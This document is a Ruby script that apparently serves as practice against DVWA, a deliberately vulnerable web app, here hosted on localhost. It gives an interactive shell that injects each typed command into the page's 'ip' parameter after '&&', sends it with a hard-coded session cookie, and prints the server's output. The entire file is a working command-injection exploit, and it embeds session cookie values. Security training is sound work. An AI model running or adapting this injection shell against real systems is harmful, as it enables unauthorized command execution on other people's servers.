require "net/http"
require "nokogiri"
require "digest"
require "colorize"

url = URI("http://localhost/DVWA-master/vulnerabilities/exec/")
cookie = "security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e"
while true
  print "$ ".green
  cmd = gets.chomp
  cmd == "exit" ? exit : nil
  commandinj = "ip=google.com+%26%26+#{cmd}&Submit=Submit"

  req = Net::HTTP::Post.new(url)
  req["Cookie"] = cookie
  req.body = commandinj

  res = Net::HTTP.start(url.hostname, url.port) { |http|
    http.request(req)
  }

  doc = Nokogiri::HTML(res.body)
  doc.css("pre")[0].content[475..] == nil ?
    (puts "command not found".green) :
    (puts doc.css("pre")[0].content[463..].green)
end
